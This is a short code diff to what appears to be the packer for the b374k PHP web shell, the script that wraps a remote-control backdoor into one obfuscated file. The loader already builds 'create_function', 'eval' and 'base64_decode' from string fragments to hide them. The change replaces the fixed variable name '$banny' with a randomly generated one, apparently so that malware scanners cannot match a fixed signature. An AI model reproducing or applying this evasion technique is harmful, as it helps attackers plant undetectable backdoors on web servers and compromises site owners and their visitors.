@@ -290,7 +290,6 @@ else{
 		$output .= "\t-l\t\t\t\t\tlist available modules\n";
 		$output .= "\t-k\t\t\t\t\tlist available themes\n";
 		$output .= "\t-u code\t\t\t\t\tsystem language encode, such as utf-8/gb2312/gbk..\n";
-
 	}
 	else{
 		$opt = getopt("o:p:t:m:sbz:c:lku:");
@@ -590,7 +589,8 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 			$encoder = "ba'.'se'.'64'.'_de'.'co'.'de(\"\$x\")";
 		}
 
-		$code = $header.$password."\$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$banny=\$func('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$banny(\"".$content."\");{$rc4_function}?>";
+		$func = '_'.generateRandomString(4);
+		$code = $header.$password."\$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$".$func."=\$func('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$".$func."(\"".$content."\");{$rc4_function}?>";
 	}
 	else{
 		if($compress!='no'){
